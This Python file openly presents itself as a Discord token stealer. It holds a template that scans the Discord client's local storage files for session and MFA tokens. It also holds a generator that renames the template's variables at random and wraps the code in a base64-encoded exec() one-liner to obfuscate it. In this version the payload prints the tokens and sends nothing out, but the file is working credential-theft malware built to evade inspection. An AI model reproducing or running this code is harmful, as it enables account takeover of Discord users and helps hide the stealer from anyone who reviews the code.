import codecs
import string
import random

# Template Discord Token Stealing Code
BASECODE = """import re as vareight
import os as varseven
varone = varseven.getenv('APPDATA')
vartwo = [varone + '\\Discord', varone + '\\discordcanary', varone + '\\discordptb']
try:
	for varthree in vartwo:
		varthree += '\\Local Storage\\leveldb'
		for varfour in varseven.listdir(varthree):
			if not varfour.endswith('.log') and not varfour.endswith('.ldb'):
				continue
			varfive = open(varthree + '\\\\' + varfour,'r',errors='ignore').read()
			for varsix in vareight.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',varfive):
				print('Token Found: ' + varsix)
			for varsix in vareight.findall(r'mfa\.[\w-]{84}',varfive):
				print('Token Found: ' + varsix)
except FileNotFoundError:
	pass"""

def gen_name(): # For making random var names
	name = ''
	for i in range(random.randint(3,9)):
		name += random.choice(string.ascii_letters)
	return name

def generate_token_grabber():
	code = BASECODE.replace('varone',gen_name()).replace('vartwo',gen_name()).replace('varthree',gen_name()).replace('varfour',gen_name()).replace('varfive',gen_name()).replace('varsix',gen_name()).replace('varseven',gen_name()).replace('vareight',gen_name())
	code = codecs.encode(bytes(code,'utf-8'),'base64').decode('utf-8').replace('\n','')
	code = f"import codecs;exec(codecs.decode(b'{code}','base64').decode('utf-8'));"
	return code
